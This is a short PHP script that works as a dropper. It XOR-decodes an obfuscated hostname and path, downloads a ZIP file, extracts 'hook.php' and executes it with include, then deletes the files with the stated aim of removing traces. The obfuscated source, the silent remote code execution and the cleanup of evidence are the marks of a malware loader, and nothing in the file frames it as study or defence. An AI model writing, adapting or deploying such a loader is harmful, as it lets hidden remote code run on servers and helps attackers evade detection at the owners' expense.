<?php
// --- Decryption Function ---
function xorDecrypt($encryptedData, $key) {
    $decryptedOutput = '';
    $keyLength = strlen($key);
    for ($i = 0; $i < strlen($encryptedData); $i++) {
        $decryptedOutput .= chr(ord($encryptedData[$i]) ^ ord($key[$i % $keyLength]));
    }
    return $decryptedOutput;
}

// --- Decrypted Data ---
 $secretKey = "!";
 $hostname = xorDecrypt("FHUITCBNL", $secretKey);
 $path = xorDecrypt("xTB@DSHORHLQMDBLE@OEC@BJENNSS@VSDGRID@ERL@HOCP[HQ", $secretKey);

// --- URL and Filename Construction ---
 $url = "https://" . $hostname . $path;
 $localZipFile = 'tmp.zip';
 $fileToExecuteInsideZip = 'hook.php'; // The file to be extracted and executed

echo "Target URL: " . $url . "\n";

// --- Step 1: Check for ZIP extension ---
if (!extension_loaded('zip')) {
    die("ERROR: PHP 'zip' extension is not enabled.");
}

// --- Step 2: Download the ZIP file ---
echo "Downloading file...\n";
 $downloadedData = file_get_contents($url);
if ($downloadedData === false) {
    die("ERROR: Failed to download file from URL.");
}

// --- Step 3: Save the ZIP file to the server ---
echo "Saving file to '$localZipFile'...\n";
 $bytesWritten = file_put_contents($localZipFile, $downloadedData);
if ($bytesWritten === false) {
    die("ERROR: Failed to save file to disk.");
}

// --- Step 4: Extract the desired file ---
echo "Extracting '$fileToExecuteInsideZip' from '$localZipFile'...\n";
 $zip = new ZipArchive;

// Open the ZIP archive
if ($zip->open($localZipFile) === TRUE) {
    // Extract ONLY the 'hook.php' file to the same directory (the directory where this script runs)
    if ($zip->extractTo(__DIR__, $fileToExecuteInsideZip)) {
        echo "File '$fileToExecuteInsideZip' extracted successfully.\n";
    } else {
        $zip->close();
        die("ERROR: Failed to extract '$fileToExecuteInsideZip' from ZIP.");
    }
    // Close the ZIP archive
    $zip->close();
} else {
    die("ERROR: Failed to open '$localZipFile' as a valid ZIP archive.");
}

// --- Step 5: Execute the extracted PHP file ---
echo "Executing file '$fileToExecuteInsideZip'...\n";
// Now we include the extracted file, not from within the ZIP
include $fileToExecuteInsideZip;

// --- Step 6: Cleanup (VERY IMPORTANT) ---
// Delete the extracted file and the ZIP file to remove traces
if (file_exists($fileToExecuteInsideZip)) {
    unlink($fileToExecuteInsideZip);
    echo "File '$fileToExecuteInsideZip' has been deleted.\n";
}
if (file_exists($localZipFile)) {
    unlink($localZipFile);
    echo "File '$localZipFile' has been deleted.\n";
}

echo "Process finished.\n";
?>